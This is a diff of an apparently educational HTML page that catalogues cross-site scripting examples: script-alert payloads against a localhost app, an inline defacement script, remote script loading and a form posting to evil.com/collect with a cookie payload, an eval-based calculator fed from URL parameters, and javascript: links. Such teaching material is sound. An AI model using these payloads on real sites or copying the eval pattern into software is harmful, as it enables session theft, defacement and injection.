@@ -6,14 +6,14 @@
     <br /><br />
     <textarea rows="25%" cols="100%">
 
-
+      <hr>
 XSS attack 1: 
 ---------------------
 http://localhost:9081/xss-attack?xssvalue=<script>alert("XSS attack 1")</script>
 document.getElementsByTagName('*')
 document.getElementsByTagName("*")[2].innerHTML
 document.getElementsByTagName("*")[2].outerHTML
-
+<hr>
 non-XSS attack 2: String vs Script
 -----------------------------------
 http://localhost:9081/xss-attack?xssvalue=' <script>  alert('XSS attack 2') </script>'
@@ -21,6 +21,7 @@ document.getElementsByTagName('*')
 document.getElementsByTagName("*")[4].innerHTML
 document.getElementsByTagName("*")[4].outerHTML
 
+<hr>
 XSS attack 3: script in JS file
 -----------------------------------
 http://localhost:9081/xss-attack?xssvalue=<script src=http://localhost:3000/xss/xss.js> </script>
@@ -29,5 +30,67 @@ document.getElementsByTagName("*")[2].innerHTML
 document.getElementsByTagName("*")[2].outerHTML
 </textarea
     >
+    <hr />
+    <br /><br />
+
+    inline<br />
+    <textarea rows="3" cols="100">
+    <script>document.body.innerHTML='defaced'</script>
+    </textarea>
+
+    <br /><br />
+    inline event handlers<br />
+    <textarea rows="3" cols="100">
+      <button id="btn" onclick="doSomething()"></button>
+    </textarea>
+
+    <br /><br />
+    Remote Script Loading<br />
+    <textarea rows="3" cols="100">
+    <script src="https://evil.com/hacked.js"></script>
+  </textarea
+    >
+    <br /><br />
+    Text to Script with Eval // A Simple Calculator var op1 =<br />
+    <textarea rows="10" cols="100">
+    getUrlParameter("op1"); 
+    var op2 = getUrlParameter("op2"); 
+    var sum =
+    eval(`${op1} + ${op2}`); 
+    console.log(`The sum is: ${sum}`); Inject XSS into
+  </textarea
+    >
+    <br /><br />
+    Forms<br />
+
+    <form method="POST" action="https://evil.com/collect">
+      <label>Username</label>
+      <input
+        size="60"
+        type="text"
+        name="username"
+        value="<script>alert(I have your cookies+ document.cookie)</script>
+      "
+      />
+
+      <br /><br />
+      Malicious Java in pdf, flash, execute <br />
+      <textarea rows="10" cols="100">
+      <object
+        type="application/pdf"
+        data="/media/examples/In-CC0.pdf"
+        width="250"
+        height="200"
+      ></object>
+    </textarea
+      >
+
+      <br /><br />
+      Javascript in URL <br />
+      <textarea rows="5" cols="60">
+        <a href="javascript: ...JS CODE...">js</a>
+    </textarea
+      >
+    </form>
   </body>
 </html>
